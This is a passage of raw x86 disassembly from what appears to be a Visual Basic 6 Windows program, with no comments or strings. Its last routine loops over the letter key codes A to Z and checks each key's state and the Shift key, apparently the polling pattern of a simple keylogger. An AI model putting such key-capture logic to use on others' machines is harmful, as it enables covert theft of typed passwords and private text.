  402c8a:	8b 35 34 73 40 00    	mov    0x407334,%esi
  402c90:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  402c93:	50                   	push   %eax
  402c94:	56                   	push   %esi
  402c95:	8b 16                	mov    (%esi),%edx
  402c97:	ff 52 14             	call   *0x14(%edx)
  402c9a:	3b c7                	cmp    %edi,%eax
  402c9c:	db e2                	fnclex
  402c9e:	7d 0f                	jge    0x402caf
  402ca0:	6a 14                	push   $0x14
  402ca2:	68 68 24 40 00       	push   $0x402468
  402ca7:	56                   	push   %esi
  402ca8:	50                   	push   %eax
  402ca9:	ff 15 28 10 40 00    	call   *0x401028
  402caf:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  402cb2:	57                   	push   %edi
  402cb3:	50                   	push   %eax
  402cb4:	8b f0                	mov    %eax,%esi
  402cb6:	8b 08                	mov    (%eax),%ecx
  402cb8:	ff 51 7c             	call   *0x7c(%ecx)
  402cbb:	3b c7                	cmp    %edi,%eax
  402cbd:	db e2                	fnclex
  402cbf:	7d 0f                	jge    0x402cd0
  402cc1:	6a 7c                	push   $0x7c
  402cc3:	68 88 24 40 00       	push   $0x402488
  402cc8:	56                   	push   %esi
  402cc9:	50                   	push   %eax
  402cca:	ff 15 28 10 40 00    	call   *0x401028
  402cd0:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  402cd3:	ff 15 c8 10 40 00    	call   *0x4010c8
  402cd9:	8d 55 b4             	lea    -0x4c(%ebp),%edx
  402cdc:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  402cdf:	c7 45 bc 9c 24 40 00 	movl   $0x40249c,-0x44(%ebp)
  402ce6:	c7 45 b4 08 00 00 00 	movl   $0x8,-0x4c(%ebp)
  402ced:	ff 15 ac 10 40 00    	call   *0x4010ac
  402cf3:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  402cf6:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  402cf9:	52                   	push   %edx
  402cfa:	50                   	push   %eax
  402cfb:	ff 15 30 10 40 00    	call   *0x401030
  402d01:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  402d04:	51                   	push   %ecx
  402d05:	ff 15 08 10 40 00    	call   *0x401008
  402d0b:	8b d0                	mov    %eax,%edx
  402d0d:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  402d10:	ff 15 b8 10 40 00    	call   *0x4010b8
  402d16:	8b d0                	mov    %eax,%edx
  402d18:	8d 4b 38             	lea    0x38(%ebx),%ecx
  402d1b:	ff 15 94 10 40 00    	call   *0x401094
  402d21:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  402d24:	ff 15 cc 10 40 00    	call   *0x4010cc
  402d2a:	8d 55 c4             	lea    -0x3c(%ebp),%edx
  402d2d:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  402d30:	52                   	push   %edx
  402d31:	50                   	push   %eax
  402d32:	6a 02                	push   $0x2
  402d34:	ff 15 10 10 40 00    	call   *0x401010
  402d3a:	83 c4 0c             	add    $0xc,%esp
  402d3d:	89 7d fc             	mov    %edi,-0x4(%ebp)
  402d40:	68 6e 2d 40 00       	push   $0x402d6e
  402d45:	eb 26                	jmp    0x402d6d
  402d47:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  402d4a:	ff 15 cc 10 40 00    	call   *0x4010cc
  402d50:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  402d53:	ff 15 c8 10 40 00    	call   *0x4010c8
  402d59:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  402d5c:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  402d5f:	51                   	push   %ecx
  402d60:	52                   	push   %edx
  402d61:	6a 02                	push   $0x2
  402d63:	ff 15 10 10 40 00    	call   *0x401010
  402d69:	83 c4 0c             	add    $0xc,%esp
  402d6c:	c3                   	ret
  402d6d:	c3                   	ret
  402d6e:	8b 45 08             	mov    0x8(%ebp),%eax
  402d71:	50                   	push   %eax
  402d72:	8b 08                	mov    (%eax),%ecx
  402d74:	ff 51 08             	call   *0x8(%ecx)
  402d77:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402d7a:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  402d7d:	5f                   	pop    %edi
  402d7e:	5e                   	pop    %esi
  402d7f:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402d86:	5b                   	pop    %ebx
  402d87:	8b e5                	mov    %ebp,%esp
  402d89:	5d                   	pop    %ebp
  402d8a:	c2 04 00             	ret    $0x4
  402d8d:	90                   	nop
  402d8e:	90                   	nop
  402d8f:	90                   	nop
  402d90:	55                   	push   %ebp
  402d91:	8b ec                	mov    %esp,%ebp
  402d93:	83 ec 0c             	sub    $0xc,%esp
  402d96:	68 26 11 40 00       	push   $0x401126
  402d9b:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  402da1:	50                   	push   %eax
  402da2:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  402da9:	83 ec 64             	sub    $0x64,%esp
  402dac:	53                   	push   %ebx
  402dad:	56                   	push   %esi
  402dae:	57                   	push   %edi
  402daf:	89 65 f4             	mov    %esp,-0xc(%ebp)
  402db2:	c7 45 f8 e8 10 40 00 	movl   $0x4010e8,-0x8(%ebp)
  402db9:	8b 7d 08             	mov    0x8(%ebp),%edi
  402dbc:	8b c7                	mov    %edi,%eax
  402dbe:	83 e0 01             	and    $0x1,%eax
  402dc1:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402dc4:	83 e7 fe             	and    $0xfffffffe,%edi
  402dc7:	57                   	push   %edi
  402dc8:	89 7d 08             	mov    %edi,0x8(%ebp)
  402dcb:	8b 0f                	mov    (%edi),%ecx
  402dcd:	ff 51 04             	call   *0x4(%ecx)
  402dd0:	8b 17                	mov    (%edi),%edx
  402dd2:	33 f6                	xor    %esi,%esi
  402dd4:	57                   	push   %edi
  402dd5:	89 75 d8             	mov    %esi,-0x28(%ebp)
  402dd8:	89 75 d4             	mov    %esi,-0x2c(%ebp)
  402ddb:	89 75 d0             	mov    %esi,-0x30(%ebp)
  402dde:	89 75 c4             	mov    %esi,-0x3c(%ebp)
  402de1:	89 75 c0             	mov    %esi,-0x40(%ebp)
  402de4:	89 75 bc             	mov    %esi,-0x44(%ebp)
  402de7:	89 75 b8             	mov    %esi,-0x48(%ebp)
  402dea:	89 75 b4             	mov    %esi,-0x4c(%ebp)
  402ded:	89 75 b0             	mov    %esi,-0x50(%ebp)
  402df0:	89 75 ac             	mov    %esi,-0x54(%ebp)
  402df3:	89 75 a8             	mov    %esi,-0x58(%ebp)
  402df6:	89 75 a4             	mov    %esi,-0x5c(%ebp)
  402df9:	ff 92 04 03 00 00    	call   *0x304(%edx)
  402dff:	50                   	push   %eax
  402e00:	8d 45 a8             	lea    -0x58(%ebp),%eax
  402e03:	50                   	push   %eax
  402e04:	ff 15 34 10 40 00    	call   *0x401034
  402e0a:	8b d8                	mov    %eax,%ebx
  402e0c:	8d 55 c4             	lea    -0x3c(%ebp),%edx
  402e0f:	52                   	push   %edx
  402e10:	53                   	push   %ebx
  402e11:	8b 0b                	mov    (%ebx),%ecx
  402e13:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  402e19:	3b c6                	cmp    %esi,%eax
  402e1b:	db e2                	fnclex
  402e1d:	7d 12                	jge    0x402e31
  402e1f:	68 a0 00 00 00       	push   $0xa0
  402e24:	68 b8 24 40 00       	push   $0x4024b8
  402e29:	53                   	push   %ebx
  402e2a:	50                   	push   %eax
  402e2b:	ff 15 28 10 40 00    	call   *0x401028
  402e31:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  402e34:	50                   	push   %eax
  402e35:	68 cc 24 40 00       	push   $0x4024cc
  402e3a:	ff 15 4c 10 40 00    	call   *0x40104c
  402e40:	8b d8                	mov    %eax,%ebx
  402e42:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  402e45:	f7 db                	neg    %ebx
  402e47:	1b db                	sbb    %ebx,%ebx
  402e49:	f7 db                	neg    %ebx
  402e4b:	f7 db                	neg    %ebx
  402e4d:	ff 15 cc 10 40 00    	call   *0x4010cc
  402e53:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  402e56:	ff 15 c8 10 40 00    	call   *0x4010c8
  402e5c:	66 3b de             	cmp    %si,%bx
  402e5f:	0f 84 11 02 00 00    	je     0x403076
  402e65:	56                   	push   %esi
  402e66:	56                   	push   %esi
  402e67:	56                   	push   %esi
  402e68:	56                   	push   %esi
  402e69:	8b 35 b0 10 40 00    	mov    0x4010b0,%esi
  402e6f:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  402e72:	68 0c 20 40 00       	push   $0x40200c
  402e77:	51                   	push   %ecx
  402e78:	ff d6                	call   *%esi
  402e7a:	50                   	push   %eax
  402e7b:	e8 94 f3 ff ff       	call   0x402214
  402e80:	8b 1d 24 10 40 00    	mov    0x401024,%ebx
  402e86:	89 45 9c             	mov    %eax,-0x64(%ebp)
  402e89:	ff d3                	call   *%ebx
  402e8b:	8b 55 9c             	mov    -0x64(%ebp),%edx
  402e8e:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  402e91:	89 55 d4             	mov    %edx,-0x2c(%ebp)
  402e94:	ff 15 cc 10 40 00    	call   *0x4010cc
  402e9a:	6a 00                	push   $0x0
  402e9c:	6a 00                	push   $0x0
  402e9e:	6a 03                	push   $0x3
  402ea0:	8d 45 bc             	lea    -0x44(%ebp),%eax
  402ea3:	68 cc 24 40 00       	push   $0x4024cc
  402ea8:	50                   	push   %eax
  402ea9:	ff d6                	call   *%esi
  402eab:	50                   	push   %eax
  402eac:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  402eaf:	68 cc 24 40 00       	push   $0x4024cc
  402eb4:	51                   	push   %ecx
  402eb5:	ff d6                	call   *%esi
  402eb7:	50                   	push   %eax
  402eb8:	6a 50                	push   $0x50
  402eba:	8d 55 c4             	lea    -0x3c(%ebp),%edx
  402ebd:	68 d8 1f 40 00       	push   $0x401fd8
  402ec2:	52                   	push   %edx
  402ec3:	ff d6                	call   *%esi
  402ec5:	50                   	push   %eax
  402ec6:	8b 45 9c             	mov    -0x64(%ebp),%eax
  402ec9:	50                   	push   %eax
  402eca:	e8 ed f3 ff ff       	call   0x4022bc
  402ecf:	89 45 9c             	mov    %eax,-0x64(%ebp)
  402ed2:	ff d3                	call   *%ebx
  402ed4:	8b 4d 9c             	mov    -0x64(%ebp),%ecx
  402ed7:	8d 55 bc             	lea    -0x44(%ebp),%edx
  402eda:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  402edd:	8d 45 c0             	lea    -0x40(%ebp),%eax
  402ee0:	52                   	push   %edx
  402ee1:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  402ee4:	50                   	push   %eax
  402ee5:	51                   	push   %ecx
  402ee6:	6a 03                	push   $0x3
  402ee8:	ff 15 9c 10 40 00    	call   *0x40109c
  402eee:	8b 17                	mov    (%edi),%edx
  402ef0:	83 c4 10             	add    $0x10,%esp
  402ef3:	57                   	push   %edi
  402ef4:	ff 92 04 03 00 00    	call   *0x304(%edx)
  402efa:	50                   	push   %eax
  402efb:	8d 45 a8             	lea    -0x58(%ebp),%eax
  402efe:	50                   	push   %eax
  402eff:	ff 15 34 10 40 00    	call   *0x401034
  402f05:	8b 08                	mov    (%eax),%ecx
  402f07:	8d 55 c4             	lea    -0x3c(%ebp),%edx
  402f0a:	52                   	push   %edx
  402f0b:	50                   	push   %eax
  402f0c:	89 45 98             	mov    %eax,-0x68(%ebp)
  402f0f:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  402f15:	85 c0                	test   %eax,%eax
  402f17:	db e2                	fnclex
  402f19:	7d 15                	jge    0x402f30
  402f1b:	8b 4d 98             	mov    -0x68(%ebp),%ecx
  402f1e:	68 a0 00 00 00       	push   $0xa0
  402f23:	68 b8 24 40 00       	push   $0x4024b8
  402f28:	51                   	push   %ecx
  402f29:	50                   	push   %eax
  402f2a:	ff 15 28 10 40 00    	call   *0x401028
  402f30:	6a 00                	push   $0x0
  402f32:	68 00 00 00 80       	push   $0x80000000
  402f37:	6a 00                	push   $0x0
  402f39:	6a 00                	push   $0x0
  402f3b:	8d 55 ac             	lea    -0x54(%ebp),%edx
  402f3e:	68 18 25 40 00       	push   $0x402518
  402f43:	52                   	push   %edx
  402f44:	ff d6                	call   *%esi
  402f46:	50                   	push   %eax
  402f47:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  402f4a:	68 e0 24 40 00       	push   $0x4024e0
  402f4f:	50                   	push   %eax
  402f50:	ff 15 20 10 40 00    	call   *0x401020
  402f56:	8b d0                	mov    %eax,%edx
  402f58:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  402f5b:	ff 15 b8 10 40 00    	call   *0x4010b8
  402f61:	50                   	push   %eax
  402f62:	68 04 25 40 00       	push   $0x402504
  402f67:	ff 15 20 10 40 00    	call   *0x401020
  402f6d:	8b d0                	mov    %eax,%edx
  402f6f:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  402f72:	ff 15 b8 10 40 00    	call   *0x4010b8
  402f78:	8b 4f 38             	mov    0x38(%edi),%ecx
  402f7b:	50                   	push   %eax
  402f7c:	51                   	push   %ecx
  402f7d:	ff 15 20 10 40 00    	call   *0x401020
  402f83:	8b d0                	mov    %eax,%edx
  402f85:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  402f88:	ff 15 b8 10 40 00    	call   *0x4010b8
  402f8e:	8d 55 b0             	lea    -0x50(%ebp),%edx
  402f91:	50                   	push   %eax
  402f92:	52                   	push   %edx
  402f93:	ff d6                	call   *%esi
  402f95:	50                   	push   %eax
  402f96:	8d 45 b8             	lea    -0x48(%ebp),%eax
  402f99:	68 d4 24 40 00       	push   $0x4024d4
  402f9e:	50                   	push   %eax
  402f9f:	ff d6                	call   *%esi
  402fa1:	8b 4d 9c             	mov    -0x64(%ebp),%ecx
  402fa4:	50                   	push   %eax
  402fa5:	51                   	push   %ecx
  402fa6:	e8 49 f3 ff ff       	call   0x4022f4
  402fab:	8b f0                	mov    %eax,%esi
  402fad:	ff d3                	call   *%ebx
  402faf:	8d 55 ac             	lea    -0x54(%ebp),%edx
  402fb2:	8d 45 b0             	lea    -0x50(%ebp),%eax
  402fb5:	52                   	push   %edx
  402fb6:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  402fb9:	50                   	push   %eax
  402fba:	8d 55 b8             	lea    -0x48(%ebp),%edx
  402fbd:	51                   	push   %ecx
  402fbe:	8d 45 bc             	lea    -0x44(%ebp),%eax
  402fc1:	52                   	push   %edx
  402fc2:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  402fc5:	50                   	push   %eax
  402fc6:	8d 55 c4             	lea    -0x3c(%ebp),%edx
  402fc9:	51                   	push   %ecx
  402fca:	52                   	push   %edx
  402fcb:	6a 07                	push   $0x7
  402fcd:	89 75 d0             	mov    %esi,-0x30(%ebp)
  402fd0:	ff 15 9c 10 40 00    	call   *0x40109c
  402fd6:	83 c4 20             	add    $0x20,%esp
  402fd9:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  402fdc:	ff 15 c8 10 40 00    	call   *0x4010c8
  402fe2:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  402fe5:	6a 00                	push   $0x0
  402fe7:	50                   	push   %eax
  402fe8:	6a 00                	push   $0x0
  402fea:	6a 00                	push   $0x0
  402fec:	56                   	push   %esi
  402fed:	c7 45 a4 00 00 00 00 	movl   $0x0,-0x5c(%ebp)
  402ff4:	e8 47 f3 ff ff       	call   0x402340
  402ff9:	8b f0                	mov    %eax,%esi
  402ffb:	ff d3                	call   *%ebx
  402ffd:	0f bf c6             	movswl %si,%eax
  403000:	85 c0                	test   %eax,%eax
  403002:	74 45                	je     0x403049
  403004:	8b 0f                	mov    (%edi),%ecx
  403006:	57                   	push   %edi
  403007:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  40300d:	8d 55 a8             	lea    -0x58(%ebp),%edx
  403010:	50                   	push   %eax
  403011:	52                   	push   %edx
  403012:	ff 15 34 10 40 00    	call   *0x401034
  403018:	8b f0                	mov    %eax,%esi
  40301a:	68 cc 24 40 00       	push   $0x4024cc
  40301f:	56                   	push   %esi
  403020:	8b 06                	mov    (%esi),%eax
  403022:	ff 90 a4 00 00 00    	call   *0xa4(%eax)
  403028:	85 c0                	test   %eax,%eax
  40302a:	db e2                	fnclex
  40302c:	7d 12                	jge    0x403040
  40302e:	68 a4 00 00 00       	push   $0xa4
  403033:	68 b8 24 40 00       	push   $0x4024b8
  403038:	56                   	push   %esi
  403039:	50                   	push   %eax
  40303a:	ff 15 28 10 40 00    	call   *0x401028
  403040:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  403043:	ff 15 c8 10 40 00    	call   *0x4010c8
  403049:	33 f6                	xor    %esi,%esi
  40304b:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  40304e:	51                   	push   %ecx
  40304f:	e8 0c f2 ff ff       	call   0x402260
  403054:	ff d3                	call   *%ebx
  403056:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  403059:	52                   	push   %edx
  40305a:	e8 01 f2 ff ff       	call   0x402260
  40305f:	ff d3                	call   *%ebx
  403061:	8b 45 d8             	mov    -0x28(%ebp),%eax
  403064:	50                   	push   %eax
  403065:	e8 f6 f1 ff ff       	call   0x402260
  40306a:	ff d3                	call   *%ebx
  40306c:	89 75 fc             	mov    %esi,-0x4(%ebp)
  40306f:	68 b0 30 40 00       	push   $0x4030b0
  403074:	eb 39                	jmp    0x4030af
  403076:	8b 1d 24 10 40 00    	mov    0x401024,%ebx
  40307c:	eb cd                	jmp    0x40304b
  40307e:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  403081:	8d 55 b0             	lea    -0x50(%ebp),%edx
  403084:	51                   	push   %ecx
  403085:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  403088:	52                   	push   %edx
  403089:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  40308c:	50                   	push   %eax
  40308d:	8d 55 bc             	lea    -0x44(%ebp),%edx
  403090:	51                   	push   %ecx
  403091:	8d 45 c0             	lea    -0x40(%ebp),%eax
  403094:	52                   	push   %edx
  403095:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  403098:	50                   	push   %eax
  403099:	51                   	push   %ecx
  40309a:	6a 07                	push   $0x7
  40309c:	ff 15 9c 10 40 00    	call   *0x40109c
  4030a2:	83 c4 20             	add    $0x20,%esp
  4030a5:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  4030a8:	ff 15 c8 10 40 00    	call   *0x4010c8
  4030ae:	c3                   	ret
  4030af:	c3                   	ret
  4030b0:	8b 45 08             	mov    0x8(%ebp),%eax
  4030b3:	50                   	push   %eax
  4030b4:	8b 10                	mov    (%eax),%edx
  4030b6:	ff 52 08             	call   *0x8(%edx)
  4030b9:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4030bc:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4030bf:	5f                   	pop    %edi
  4030c0:	5e                   	pop    %esi
  4030c1:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4030c8:	5b                   	pop    %ebx
  4030c9:	8b e5                	mov    %ebp,%esp
  4030cb:	5d                   	pop    %ebp
  4030cc:	c2 04 00             	ret    $0x4
  4030cf:	90                   	nop
  4030d0:	55                   	push   %ebp
  4030d1:	8b ec                	mov    %esp,%ebp
  4030d3:	83 ec 0c             	sub    $0xc,%esp
  4030d6:	68 26 11 40 00       	push   $0x401126
  4030db:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4030e1:	50                   	push   %eax
  4030e2:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4030e9:	83 ec 24             	sub    $0x24,%esp
  4030ec:	53                   	push   %ebx
  4030ed:	56                   	push   %esi
  4030ee:	57                   	push   %edi
  4030ef:	89 65 f4             	mov    %esp,-0xc(%ebp)
  4030f2:	c7 45 f8 f8 10 40 00 	movl   $0x4010f8,-0x8(%ebp)
  4030f9:	8b 75 08             	mov    0x8(%ebp),%esi
  4030fc:	8b c6                	mov    %esi,%eax
  4030fe:	83 e0 01             	and    $0x1,%eax
  403101:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403104:	83 e6 fe             	and    $0xfffffffe,%esi
  403107:	56                   	push   %esi
  403108:	89 75 08             	mov    %esi,0x8(%ebp)
  40310b:	8b 0e                	mov    (%esi),%ecx
  40310d:	ff 51 04             	call   *0x4(%ecx)
  403110:	8b 16                	mov    (%esi),%edx
  403112:	33 c0                	xor    %eax,%eax
  403114:	56                   	push   %esi
  403115:	89 45 e8             	mov    %eax,-0x18(%ebp)
  403118:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  40311b:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40311e:	ff 92 04 03 00 00    	call   *0x304(%edx)
  403124:	8b 1d 34 10 40 00    	mov    0x401034,%ebx
  40312a:	50                   	push   %eax
  40312b:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40312e:	50                   	push   %eax
  40312f:	ff d3                	call   *%ebx
  403131:	8b f8                	mov    %eax,%edi
  403133:	6a 00                	push   $0x0
  403135:	57                   	push   %edi
  403136:	8b 0f                	mov    (%edi),%ecx
  403138:	ff 91 14 01 00 00    	call   *0x114(%ecx)
  40313e:	85 c0                	test   %eax,%eax
  403140:	db e2                	fnclex
  403142:	7d 12                	jge    0x403156
  403144:	68 14 01 00 00       	push   $0x114
  403149:	68 b8 24 40 00       	push   $0x4024b8
  40314e:	57                   	push   %edi
  40314f:	50                   	push   %eax
  403150:	ff 15 28 10 40 00    	call   *0x401028
  403156:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  403159:	ff 15 c8 10 40 00    	call   *0x4010c8
  40315f:	8b 16                	mov    (%esi),%edx
  403161:	56                   	push   %esi
  403162:	ff 92 04 03 00 00    	call   *0x304(%edx)
  403168:	50                   	push   %eax
  403169:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40316c:	50                   	push   %eax
  40316d:	ff d3                	call   *%ebx
  40316f:	8b 0e                	mov    (%esi),%ecx
  403171:	56                   	push   %esi
  403172:	8b f8                	mov    %eax,%edi
  403174:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  40317a:	8d 55 e4             	lea    -0x1c(%ebp),%edx
  40317d:	50                   	push   %eax
  40317e:	52                   	push   %edx
  40317f:	ff d3                	call   *%ebx
  403181:	8b f0                	mov    %eax,%esi
  403183:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  403186:	51                   	push   %ecx
  403187:	56                   	push   %esi
  403188:	8b 06                	mov    (%esi),%eax
  40318a:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  403190:	85 c0                	test   %eax,%eax
  403192:	db e2                	fnclex
  403194:	7d 12                	jge    0x4031a8
  403196:	68 a0 00 00 00       	push   $0xa0
  40319b:	68 b8 24 40 00       	push   $0x4024b8
  4031a0:	56                   	push   %esi
  4031a1:	50                   	push   %eax
  4031a2:	ff 15 28 10 40 00    	call   *0x401028
  4031a8:	8b 55 e8             	mov    -0x18(%ebp),%edx
  4031ab:	8b 37                	mov    (%edi),%esi
  4031ad:	52                   	push   %edx
  4031ae:	ff 15 0c 10 40 00    	call   *0x40100c
  4031b4:	50                   	push   %eax
  4031b5:	57                   	push   %edi
  4031b6:	ff 96 1c 01 00 00    	call   *0x11c(%esi)
  4031bc:	85 c0                	test   %eax,%eax
  4031be:	db e2                	fnclex
  4031c0:	7d 12                	jge    0x4031d4
  4031c2:	68 1c 01 00 00       	push   $0x11c
  4031c7:	68 b8 24 40 00       	push   $0x4024b8
  4031cc:	57                   	push   %edi
  4031cd:	50                   	push   %eax
  4031ce:	ff 15 28 10 40 00    	call   *0x401028
  4031d4:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  4031d7:	ff 15 cc 10 40 00    	call   *0x4010cc
  4031dd:	8d 45 e0             	lea    -0x20(%ebp),%eax
  4031e0:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  4031e3:	50                   	push   %eax
  4031e4:	51                   	push   %ecx
  4031e5:	6a 02                	push   $0x2
  4031e7:	ff 15 18 10 40 00    	call   *0x401018
  4031ed:	83 c4 0c             	add    $0xc,%esp
  4031f0:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4031f7:	68 1c 32 40 00       	push   $0x40321c
  4031fc:	eb 1d                	jmp    0x40321b
  4031fe:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  403201:	ff 15 cc 10 40 00    	call   *0x4010cc
  403207:	8d 55 e0             	lea    -0x20(%ebp),%edx
  40320a:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40320d:	52                   	push   %edx
  40320e:	50                   	push   %eax
  40320f:	6a 02                	push   $0x2
  403211:	ff 15 18 10 40 00    	call   *0x401018
  403217:	83 c4 0c             	add    $0xc,%esp
  40321a:	c3                   	ret
  40321b:	c3                   	ret
  40321c:	8b 45 08             	mov    0x8(%ebp),%eax
  40321f:	50                   	push   %eax
  403220:	8b 08                	mov    (%eax),%ecx
  403222:	ff 51 08             	call   *0x8(%ecx)
  403225:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403228:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40322b:	5f                   	pop    %edi
  40322c:	5e                   	pop    %esi
  40322d:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403234:	5b                   	pop    %ebx
  403235:	8b e5                	mov    %ebp,%esp
  403237:	5d                   	pop    %ebp
  403238:	c2 04 00             	ret    $0x4
  40323b:	90                   	nop
  40323c:	90                   	nop
  40323d:	90                   	nop
  40323e:	90                   	nop
  40323f:	90                   	nop
  403240:	55                   	push   %ebp
  403241:	8b ec                	mov    %esp,%ebp
  403243:	83 ec 0c             	sub    $0xc,%esp
  403246:	68 26 11 40 00       	push   $0x401126
  40324b:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403251:	50                   	push   %eax
  403252:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  403259:	81 ec fc 01 00 00    	sub    $0x1fc,%esp
  40325f:	53                   	push   %ebx
  403260:	56                   	push   %esi
  403261:	57                   	push   %edi
  403262:	89 65 f4             	mov    %esp,-0xc(%ebp)
  403265:	c7 45 f8 08 11 40 00 	movl   $0x401108,-0x8(%ebp)
  40326c:	8b 75 08             	mov    0x8(%ebp),%esi
  40326f:	8b c6                	mov    %esi,%eax
  403271:	83 e0 01             	and    $0x1,%eax
  403274:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403277:	83 e6 fe             	and    $0xfffffffe,%esi
  40327a:	56                   	push   %esi
  40327b:	89 75 08             	mov    %esi,0x8(%ebp)
  40327e:	8b 0e                	mov    (%esi),%ecx
  403280:	ff 51 04             	call   *0x4(%ecx)
  403283:	8b 1d 34 10 40 00    	mov    0x401034,%ebx
  403289:	33 c0                	xor    %eax,%eax
  40328b:	b9 41 00 00 00       	mov    $0x41,%ecx
  403290:	89 45 dc             	mov    %eax,-0x24(%ebp)
  403293:	89 45 d8             	mov    %eax,-0x28(%ebp)
  403296:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  403299:	89 45 d0             	mov    %eax,-0x30(%ebp)
  40329c:	89 45 c0             	mov    %eax,-0x40(%ebp)
  40329f:	89 45 b0             	mov    %eax,-0x50(%ebp)
  4032a2:	89 45 a0             	mov    %eax,-0x60(%ebp)
  4032a5:	89 45 90             	mov    %eax,-0x70(%ebp)
  4032a8:	89 45 80             	mov    %eax,-0x80(%ebp)
  4032ab:	89 85 70 ff ff ff    	mov    %eax,-0x90(%ebp)
  4032b1:	89 85 60 ff ff ff    	mov    %eax,-0xa0(%ebp)
  4032b7:	89 85 50 ff ff ff    	mov    %eax,-0xb0(%ebp)
  4032bd:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  4032c0:	ba 5a 00 00 00       	mov    $0x5a,%edx
  4032c5:	3b ca                	cmp    %edx,%ecx
  4032c7:	0f 8f 40 02 00 00    	jg     0x40350d
  4032cd:	51                   	push   %ecx
  4032ce:	e8 c5 f0 ff ff       	call   0x402398
  4032d3:	8b f8                	mov    %eax,%edi
  4032d5:	ff 15 24 10 40 00    	call   *0x401024
  4032db:	6a 10                	push   $0x10
  4032dd:	0f bf ff             	movswl %di,%edi
  4032e0:	e8 b3 f0 ff ff       	call   0x402398
  4032e5:	89 85 4c ff ff ff    	mov    %eax,-0xb4(%ebp)
  4032eb:	ff 15 24 10 40 00    	call   *0x401024
  4032f1:	81 ff 01 80 ff ff    	cmp    $0xffff8001,%edi
  4032f7:	0f 85 f4 01 00 00    	jne    0x4034f1
  4032fd:	66 81 bd 4c ff ff ff 	cmpw   $0x8000,-0xb4(%ebp)
  403304:	00 80 
  403306:	0f 85 f0 00 00 00    	jne    0x4033fc
  40330c:	8b 16                	mov    (%esi),%edx
  40330e:	56                   	push   %esi
  40330f:	ff 92 04 03 00 00    	call   *0x304(%edx)
  403315:	50                   	push   %eax
  403316:	8d 45 d0             	lea    -0x30(%ebp),%eax
  403319:	50                   	push   %eax
  40331a:	ff d3                	call   *%ebx
  40331c:	8b 0e                	mov    (%esi),%ecx
  40331e:	56                   	push   %esi
  40331f:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  403325:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  40332b:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  40332e:	50                   	push   %eax
  40332f:	52                   	push   %edx
  403330:	ff d3                	call   *%ebx
  403332:	8b f8                	mov    %eax,%edi
  403334:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  403337:	51                   	push   %ecx
  403338:	57                   	push   %edi
